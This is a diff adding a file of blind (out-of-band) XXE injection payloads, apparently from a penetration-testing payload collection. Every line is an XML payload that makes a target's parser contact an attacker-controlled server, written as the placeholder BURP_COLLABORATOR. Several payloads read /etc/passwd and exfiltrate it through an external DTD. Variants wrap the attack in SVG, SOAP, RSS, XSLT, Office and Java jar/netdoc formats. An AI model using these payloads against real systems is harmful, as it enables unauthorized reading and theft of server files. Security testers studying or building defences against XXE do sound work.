@@ -1,0 +1,43 @@
+# XXE Out-of-Band (Blind XXE) Payloads
+# Replace BURP_COLLABORATOR with your OOB server (e.g., xxx.oast.fun)
+
+# Basic OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+
+# DNS OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe.BURP_COLLABORATOR">]><foo>&xxe;</foo>
+
+# Parameter Entity OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;%param1;]><foo></foo>
+
+# External DTD with Data Exfiltration
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
+
+# Error-based OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;%error;]><foo></foo>
+
+# XInclude OOB
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://BURP_COLLABORATOR/xxe"/></foo>
+
+# SVG OOB
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
+
+# SOAP OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>
+
+# RSS OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>
+
+# XSLT OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">&xxe;</xsl:template></xsl:stylesheet>
+
+# Office Document XXE (docx, xlsx, pptx)
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">&xxe;</Types>
+
+# Java Specific OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://BURP_COLLABORATOR/test.jar!/test.txt">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
